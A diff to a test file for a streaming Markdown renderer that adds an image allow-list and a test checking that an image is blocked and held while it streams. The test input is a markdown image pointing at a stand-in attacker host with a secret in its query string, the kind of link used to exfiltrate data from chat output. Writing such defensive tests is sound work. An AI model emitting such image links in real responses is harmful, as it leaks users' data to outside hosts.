@@ -87,6 +87,7 @@ describe('setupMarkedStreamingProvider', () => {
 
     it('leaves out an image until its URL is complete', () => {
         const config = new AparteConfig();
+        config.setImagePolicy(['https://example.com']);
         setupMarkedStreamingProvider(undefined, config);
 
         const target = document.createElement('div');
@@ -96,6 +97,18 @@ describe('setupMarkedStreamingProvider', () => {
 
         renderer.write('art.png)');
         expect(target.querySelector('img')?.getAttribute('src')).toBe('https://example.com/chart.png');
+        expect(target.querySelector('img')?.getAttribute('referrerpolicy')).toBe('no-referrer');
+    });
+
+    it('holds a picture the image policy does not let load, while it streams', () => {
+        const config = new AparteConfig();
+        setupMarkedStreamingProvider(undefined, config);
+
+        const target = document.createElement('div');
+        const renderer = config.createStreamingMarkdownRenderer(target)!;
+        renderer.write('a chart: ![revenue](https://attacker.example/c.png?d=secret) and more');
+        expect(target.querySelector('img')).toBeNull();
+        expect(target.querySelector('a.aparte-image-held')?.getAttribute('data-aparte-image')).toBe('https://attacker.example/c.png?d=secret');
     });
 
     it('keeps the DOM of a block already written', () => {
